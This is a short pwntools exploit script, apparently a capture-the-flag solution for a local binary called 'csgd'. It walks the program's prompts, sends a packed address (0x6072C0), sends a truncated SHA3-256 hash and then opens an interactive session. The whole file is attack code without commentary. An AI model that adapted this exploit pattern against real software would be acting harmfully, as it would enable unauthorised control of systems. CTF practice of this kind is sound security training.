from pwn import *
import hashlib


context.log_level = "debug"
hash = hashlib.sha3_256(b"1234").digest()[0:3]
p = process("./csgd")
p.recvuntil(b"csgd's revenge\n")
p.send(b"yy\n")
p.send(b"yy\n")

p.send(b"y\n")
p.recvuntil(b"what is the length of your message?\n")
p.sendline(b"64")
p.recvuntil(b"To ALL: ")
raw_input()
p.sendline(p64(0x6072C0))
p.recvline()
p.send(hash)
p.interactive()